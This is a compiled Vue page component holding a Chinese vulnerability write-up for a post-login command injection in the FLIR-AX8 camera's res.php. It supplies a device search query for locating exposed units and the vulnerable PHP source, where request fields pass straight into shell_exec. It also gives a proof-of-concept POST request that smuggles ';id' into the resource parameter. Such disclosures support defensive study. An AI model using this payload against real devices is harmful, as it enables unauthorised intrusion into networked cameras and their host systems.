import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{o as e,c as i,e as n}from"./app-58e4a7d6.js";const s={},l=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>FLIR-AX8 res.php 文件存在后台命令执行漏洞，攻击者通过默认口令登录后台后获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>FLIR-AX8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;FLIR-FLIR-AX8&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202209131036578.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件为 <strong>res.php</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
	if (isset($_POST[&quot;action&quot;])) {
		switch ($_POST[&quot;action&quot;]) {
			case &quot;get&quot;:
				if(isset($_POST[&quot;resource&quot;]))
				{
					switch ($_POST[&quot;resource&quot;]) {
						case &quot;.rtp.hflip&quot;:
							if (!file_exists(&quot;/FLIR/system/journal.d/horizontal_flip.cfg&quot;)) {
								$result = &quot;false&quot;;
								break;
							}
							$result = file_get_contents(&quot;/FLIR/system/journal.d/horizontal_flip.cfg&quot;) === &quot;1&quot; ? &quot;true&quot; : &quot;false&quot;;
							break;
						case &quot;.rtp.vflip&quot;:
							if (!file_exists(&quot;/FLIR/system/journal.d/vertical_flip.cfg&quot;)) {
								$result = &quot;false&quot;;
								break;
							}
							$result = file_get_contents(&quot;/FLIR/system/journal.d/vertical_flip.cfg&quot;) === &quot;1&quot; ? &quot;true&quot; : &quot;false&quot;;
							break;
						default:
							$result = trim(shell_exec(&quot;LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -o &quot;.$_POST[&quot;resource&quot;]));
					}
				}
				break;
			case &quot;set&quot;:
				if(isset($_POST[&quot;resource&quot;]) and isset($_POST[&quot;value&quot;])) {
					switch ($_POST[&quot;resource&quot;]) {
						case &quot;rtp.hflip&quot;:
							file_put_contents(&quot;/FLIR/system/journal.d/horizontal_flip.cfg&quot;, $_POST[&quot;value&quot;] === &quot;true&quot; ? &quot;1&quot; : &quot;0&quot;);
							break;
						case &quot;rtp.vflip&quot;:
							file_put_contents(&quot;/FLIR/system/journal.d/vertical_flip.cfg&quot;, $_POST[&quot;value&quot;] === &quot;true&quot; ? &quot;1&quot; : &quot;0&quot;);
							break;
						default:
							$result = trim(shell_exec(&quot;LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rset &quot;.$_POST[&quot;resource&quot;].&quot; &quot;.$_POST[&quot;value&quot;]));;
					}
				}

				break;
			case &quot;measurement&quot;:
				if (isset($_POST[&quot;type&quot;]) &amp;&amp; isset($_POST[&quot;id&quot;])) {
					$nodeData =  trim(shell_exec(&quot;LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -i .image.sysimg.measureFuncs.&quot;.$_POST[&quot;type&quot;].&quot;.&quot;.$_POST[&quot;id&quot;]));
					$lines = explode(&quot;\\n&quot;, $nodeData);
					foreach($lines as $line)
					{
						$resource = preg_split(&#39;/\\s+/&#39;, $line);
						$value = trim($resource[1], &quot;\\&quot;&quot;);
						$result[$resource[0]] = $value;
					}
				}
				break;
			case &quot;global-parameters&quot;:
				$nodeData =  trim(shell_exec(&quot;LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -i .image.sysimg.basicImgData.objectParams&quot;));
				$lines = explode(&quot;\\n&quot;, $nodeData);
				foreach($lines as $line)
				{
					$resource = preg_split(&#39;/\\s+/&#39;, $line);
					$result[$resource[0]] = $resource[1];
				}
			case &quot;alarm&quot;:
				if(isset($_POST[&quot;id&quot;]))
				{
					$nodeData = trim(shell_exec(&quot;LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls .image.sysimg.alarms.measfunc.&quot;.$_POST[&quot;id&quot;]));
					$lines = explode(&quot;\\n&quot;, $nodeData);
					foreach($lines as $line)
					{
						$resource = preg_split(&#39;/\\s+/&#39;, $line);
						$value = trim($resource[1], &quot;\\&quot;&quot;);
						$result[$resource[0]] = $value;
					}
				}
				break;
			case &quot;calibrate&quot;:
				$result = shell_exec(&quot;LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/nuc&quot;);

				break;
			case &quot;node&quot;:
				$nodes = trim(shell_exec(&quot;LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls &quot;.$_POST[&quot;resource&quot;]));
				$result = preg_split(&quot;/\\s+\\n/&quot;, $nodes);
				break;
		}
		echo json_encode($result);
	}
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /res.php

action=node&amp;resource=;id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202209131037844.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),u=[l];function a(r,d){return e(),i("div",null,u)}const c=t(s,[["render",a],["__file","FLIR-AX8 res.php 后台命令执行漏洞.html.vue"]]);export{c as default};
